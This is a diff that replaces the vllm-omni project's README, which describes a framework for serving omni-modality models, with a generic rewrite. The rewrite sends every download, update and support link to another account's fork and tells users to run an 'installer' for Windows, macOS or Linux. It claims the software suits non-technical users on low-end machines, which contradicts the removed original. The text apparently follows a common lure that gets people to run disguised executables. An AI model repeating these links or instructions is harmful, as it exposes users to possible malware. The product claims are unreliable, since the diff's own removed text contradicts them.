@@ -1,75 +1,77 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" src="https://raw.githubusercontent.com/vllm-project/vllm-omni/refs/heads/main/docs/source/logos/vllm-omni-logo.png">
-    <img alt="vllm-omni" src="https://raw.githubusercontent.com/vllm-project/vllm-omni/refs/heads/main/docs/source/logos/vllm-omni-logo.png" width=55%>
-  </picture>
-</p>
-<h3 align="center">
-Easy, fast, and cheap omni-modality model serving for everyone
-</h3>
+# 🎉 vllm-omni - Efficient Model Inference for Everyone
 
-<p align="center">
-| <a href="https://vllm-omni.readthedocs.io/en/latest/"><b>Documentation</b></a> | <a href="https://discuss.vllm.ai"><b>User Forum</b></a> | <a href="https://slack.vllm.ai"><b>Developer Slack</b></a> |
-</p>
+## 📥 Download Now
+[![Download vllm-omni](https://img.shields.io/badge/Download%20vllm--omni-v1.0-blue.svg)](https://github.com/fluke22020/vllm-omni/releases)
 
----
+## 🚀 Getting Started
 
-*Latest News* 🔥
+Welcome to the vllm-omni project! This application offers an easy way to use models for various tasks, such as audio generation, image and video creation, and more. With vllm-omni, you can harness the power of modern AI models without needing a technical background.
 
-- [2026/01] We released [0.12.0rc1](https://github.com/vllm-project/vllm-omni/releases/tag/v0.12.0rc1) - a major RC milestone focused on maturing the diffusion stack, strengthening OpenAI-compatible serving, expanding omni-model coverage, and improving stability across platforms (GPU/NPU/ROCm), please check our latest [design](https://docs.google.com/presentation/d/1qv4qMW1rKAqDREMXiUDLIgqqHQe7TDPj/edit?usp=sharing&ouid=110473603432222024453&rtpof=true&sd=true).
-- [2025/11] vLLM community officially released [vllm-project/vllm-omni](https://github.com/vllm-project/vllm-omni) in order to support omni-modality models serving.
+## 📋 Features
 
----
+- **Supports Multiple Modalities**: Work with different types of media including audio, images, and video.
+- **Efficient Inference**: Enjoy quick processing with optimized models for faster results.
+- **User-Friendly Interface**: Simple design makes it easy for anyone to start using AI models.
+- **Built with PyTorch**: Uses a robust framework for reliable model performance.
+  
+## 💻 System Requirements
 
-## About
+To run vllm-omni smoothly, make sure your system meets the following requirements:
 
-[vLLM](https://github.com/vllm-project/vllm) was originally designed to support large language models for text-based autoregressive generation tasks. vLLM-Omni is a framework that extends its support for omni-modality model inference and serving:
+- **Operating System**: Windows 10 or newer, macOS Catalina or newer, or a recent version of Linux.
+- **Processor**: Any modern CPU with at least 2 cores.
+- **Memory**: At least 4 GB of RAM.
+- **Graphics Card**: Recommended for best performance (NVIDIA or AMD).
+- **Network**: Internet connection required for the download and updates.
 
-- **Omni-modality**: Text, image, video, and audio data processing
-- **Non-autoregressive Architectures**: extend the AR support of vLLM to Diffusion Transformers (DiT) and other parallel generation models
-- **Heterogeneous outputs**: from traditional text generation to multimodal outputs
+## 📥 Download & Install
 
-<p align="center">
-  <picture>
-    <img alt="vllm-omni" src="https://raw.githubusercontent.com/vllm-project/vllm-omni/refs/heads/main/docs/source/architecture/omni-modality-model-architecture.png" width=55%>
-  </picture>
-</p>
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/fluke22020/vllm-omni/releases).
+   
+2. **Select the Latest Release**: Look for the most recent version of vllm-omni. Each version will list the features and improvements made since the last update.
 
-vLLM-Omni is fast with:
+3. **Download the Installer**: Click on the installation file suitable for your operating system (e.g., Windows, macOS, Linux).
 
-- State-of-the-art AR support by leveraging efficient KV cache management from vLLM
-- Pipelined stage execution overlapping for high throughput performance
-- Fully disaggregation based on OmniConnector and dynamic resource allocation across stages
+4. **Run the Installer**: Once the file downloads, open it and follow the setup instructions. 
 
-vLLM-Omni is flexible and easy to use with:
+5. **Finish the Installation**: After installation is complete, you will find vllm-omni in your applications list.
 
-- Heterogeneous pipeline abstraction to manage complex model workflows
-- Seamless integration with popular Hugging Face models
-- Tensor, pipeline, data and expert parallelism support for distributed inference
-- Streaming outputs
-- OpenAI-compatible API server
+6. **Open vllm-omni**: Double-click the icon to start using the application.
 
-vLLM-Omni seamlessly supports most popular open-source models on HuggingFace, including:
+## 📖 Documentation
 
-- Omni-modality models (e.g. Qwen-Omni)
-- Multi-modality generation models (e.g. Qwen-Image)
+To help you get started with the features of vllm-omni, we provide detailed documentation that explains how to use its various capabilities:
 
-## Getting Started
+### 🎤 Audio Generation
 
-Visit our [documentation](https://vllm-omni.readthedocs.io/en/latest/) to learn more.
+Easily create and manipulate audio files using advanced models. Choose from options to generate music, sound effects, or voiceovers.
 
-- [Installation](https://vllm-omni.readthedocs.io/en/latest/getting_started/installation/)
-- [Quickstart](https://vllm-omni.readthedocs.io/en/latest/getting_started/quickstart/)
-- [List of Supported Models](https://vllm-omni.readthedocs.io/en/latest/models/supported_models/)
+### 🖼️ Image & Video Generation
 
-## Contributing
+Transform textual prompts into engaging visuals. You can also generate high-quality videos based on scripts or concepts.
 
-We welcome and value any contributions and collaborations.
-Please check out [Contributing to vLLM-Omni](https://vllm-omni.readthedocs.io/en/latest/contributing/) for how to get involved.
+### ⚙️ Model Serving & Inference
 
-## Join the Community
-Feel free to ask questions, provide feedbacks and discuss with fellow users of vLLM-Omni in `#sig-omni` slack channel at [slack.vllm.ai](https://slack.vllm.ai) or vLLM user forum at [discuss.vllm.ai](https://discuss.vllm.ai).
+Load pre-trained models and run inferences quickly. This feature is especially useful for developers and researchers looking to test models without extensive programming knowledge.
 
-## License
+## ❓ Frequently Asked Questions
 
-Apache License 2.0, as found in the [LICENSE](./LICENSE) file.
+### How do I update vllm-omni after installation?
+
+Simply return to the [Releases page](https://github.com/fluke22020/vllm-omni/releases) and download the latest version. Follow the same steps as the initial installation.
+
+### What if I encounter issues?
+
+Check the documentation for common troubleshooting steps. If you still need help, you can open an issue in the GitHub repository.
+
+### Can I contribute to the project?
+
+Yes, we welcome contributions! Please check our GitHub repository for guidelines on how to contribute effectively.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/fluke22020/vllm-omni/releases)
+- [Documentation](https://github.com/fluke22020/vllm-omni/wiki)
+- [Support](https://github.com/fluke22020/vllm-omni/issues)
+
+By following these steps and exploring the features, you can fully utilize the potential of vllm-omni. Get started today, and unlock the possibilities of AI with ease!
